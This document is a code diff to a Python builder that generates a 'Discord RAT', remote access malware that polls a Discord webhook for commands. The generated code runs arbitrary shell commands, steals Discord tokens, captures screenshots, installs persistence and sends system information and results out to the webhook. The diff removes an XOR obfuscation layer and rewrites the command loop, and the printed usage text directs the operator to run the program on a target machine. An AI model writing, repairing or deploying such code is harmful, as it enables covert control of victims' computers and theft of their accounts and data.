@@ -25,9 +25,6 @@ def run():
     
     print("\n[+] Building Discord RAT...")
     
-    # Generate a random XOR key for encryption
-    xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-    
     code = f'''#!/usr/bin/env python3
 # Discord RAT - Controlled via Webhook
 
@@ -35,16 +32,6 @@ import requests, subprocess, os, time, sys, platform, glob, re, base64, json, th
 
 WEBHOOK = "{webhook}"
 IS_WIN = platform.system() == "Windows"
-_XOR_KEY = b'{xor_key}'
-
-def xor_crypt(data):
-    return bytes([data[i] ^ _XOR_KEY[i % len(_XOR_KEY)] for i in range(len(data))])
-
-def encrypt_cmd(cmd):
-    return base64.b64encode(xor_crypt(cmd.encode())).decode()
-
-def decrypt_cmd(data):
-    return xor_crypt(base64.b64decode(data)).decode()
 
 def send(data):
     try:
@@ -53,7 +40,7 @@ def send(data):
                 requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
         else:
             requests.post(WEBHOOK, json={{'content': data}})
-    except:
+    except Exception as e:
         pass
 
 def execute_cmd(cmd):
@@ -84,10 +71,6 @@ def get_pc_info():
         info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
         info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
         info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
-    except:
-        pass
-    
-    try:
         info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
         info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
         info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
@@ -109,7 +92,6 @@ def get_pc_info():
     
     info.append(f"Python Version: {{sys.version}}")
     info.append(f"Working Directory: {{os.getcwd()}}")
-    info.append(f"Processor: {{platform.processor()}}")
     info.append("="*30)
     
     return "\\n".join(info)
@@ -144,9 +126,7 @@ def take_screenshot():
         img = PIL.ImageGrab.grab()
         img_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'screenshot.png')
         img.save(img_path)
-        
         with open(img_path, 'rb') as f:
-            import base64
             return base64.b64encode(f.read()).decode()
     except:
         return "[!] Screenshot failed"
@@ -174,59 +154,69 @@ def main():
     # Send connection notification
     try:
         send("[+] RAT CONNECTED!")
-        send("[+] Sending system information...")
         time.sleep(1)
         pc_info = get_pc_info()
         send(pc_info)
-        send("[+] RAT is ready and waiting for commands")
-        send("[+] Type 'help' for commands")
-    except:
-        pass
+        send("[+] RAT ready. Type 'help' for commands")
+    except Exception as e:
+        send(f"[!] Startup error: {{str(e)}}")
+    
+    last_cmd = ""
+    last_cmd_time = 0
     
     while True:
         try:
-            r = requests.get(WEBHOOK, timeout=5)
-            if r.status_code == 200 and r.text:
-                cmd = r.text.strip()
-                
-                if cmd.startswith('shell '):
-                    result = execute_cmd(cmd[6:])
-                    send(result)
-                    
-                elif cmd == 'tokens':
-                    tokens = steal_tokens()
-                    if tokens:
-                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens))
-                    else:
-                        send("[!] No tokens found")
-                        
-                elif cmd == 'sysinfo':
-                    info = get_pc_info()
-                    send(info)
-                    
-                elif cmd == 'pc_info':
-                    info = get_pc_info()
-                    send(info)
-                    
-                elif cmd == 'screenshot':
-                    img = take_screenshot()
-                    if img:
-                        send("[+] Screenshot captured\\n{{img[:500]}}...")
-                    else:
-                        send("[!] Screenshot failed")
-                        
-                elif cmd == 'persist':
-                    persist_windows()
-                    send("[+] Persistence enabled")
-                    
-                elif cmd == 'connected':
-                    send("[+] RAT is connected and running")
-                    pc_info = get_pc_info()
-                    send(pc_info)
-                    
-                elif cmd == 'help':
-                    help_text = """
-=== DISCORD RAT COMMANDS ===
+            # Check for commands - use GET to read webhook messages
+            response = requests.get(WEBHOOK, timeout=5)
+            
+            if response.status_code == 200:
+                # Get the latest message from the webhook
+                try:
+                    data = response.json()
+                    # Webhook messages are stored in the response
+                    # For discord webhooks, we need to check the content
+                    if isinstance(data, list) and len(data) > 0:
+                        # Get the latest message
+                        latest = data[-1] if data else None
+                        if latest and 'content' in latest:
+                            cmd = latest['content'].strip()
+                            # Process command if it's new
+                            if cmd and cmd != last_cmd:
+                                last_cmd = cmd
+                                
+                                if cmd.startswith('shell '):
+                                    result = execute_cmd(cmd[6:])
+                                    send(result)
+                                    
+                                elif cmd == 'tokens':
+                                    tokens = steal_tokens()
+                                    if tokens:
+                                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens[:10]))
+                                    else:
+                                        send("[!] No tokens found")
+                                        
+                                elif cmd == 'sysinfo' or cmd == 'pc_info':
+                                    info = get_pc_info()
+                                    send(info)
+                                    
+                                elif cmd == 'screenshot':
+                                    img = take_screenshot()
+                                    if img and img != "[!] Screenshot failed":
+                                        send("[+] Screenshot captured\\n" + img[:500] + "...")
+                                    else:
+                                        send("[!] Screenshot failed")
+                                        
+                                elif cmd == 'persist':
+                                    persist_windows()
+                                    send("[+] Persistence enabled")
+                                    
+                                elif cmd == 'connected':
+                                    send("[+] RAT is connected and running")
+                                    pc_info = get_pc_info()
+                                    send(pc_info)
+                                    
+                                elif cmd == 'help':
+                                    help_text = """=== DISCORD RAT COMMANDS ===
 shell [cmd]  - Execute system command
 tokens       - Steal Discord tokens
 sysinfo      - Get system information
@@ -235,21 +225,28 @@ screenshot   - Take screenshot
 persist      - Enable persistence
 connected    - Check if RAT is connected
 help         - Show this help
-exit         - Stop the RAT
-"""
-                    send(help_text)
-                    
-                elif cmd == 'exit':
-                    send("[!] RAT shutting down...")
-                    sys.exit(0)
-                    
-                else:
-                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
-                    
+exit         - Stop the RAT"""
+                                    send(help_text)
+                                    
+                                elif cmd == 'exit':
+                                    send("[!] RAT shutting down...")
+                                    sys.exit(0)
+                                    
+                                else:
+                                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
+                except json.JSONDecodeError:
+                    # If response is not JSON, try to parse as text
+                    # Webhook responses can vary
+                    pass
+                except Exception as e:
+                    pass
+            
+            time.sleep(5)
+            
+        except requests.exceptions.RequestException:
+            time.sleep(5)
         except Exception as e:
             time.sleep(5)
-        
-        time.sleep(5)
 
 if __name__ == "__main__":
     main()
@@ -281,12 +278,10 @@ pause
     print("="*60)
     print("1. Run the RAT on the target machine:")
     print(f"   python {filename}.py")
-    print("\n2. When the RAT starts, it will send:")
-    print("   - Connection notification")
-    print("   - PC information (OS, CPU, RAM, Disk, IP)")
+    print("\n2. The RAT will send PC info on startup")
     print("\n3. Send commands via webhook:")
     print("   - Go to your Discord webhook URL")
-    print("   - Send a message with the command")
+    print("   - Type a command and send it")
     print("\n4. Available commands:")
     print("   shell [cmd]  - Execute system command")
     print("   tokens       - Steal Discord tokens")
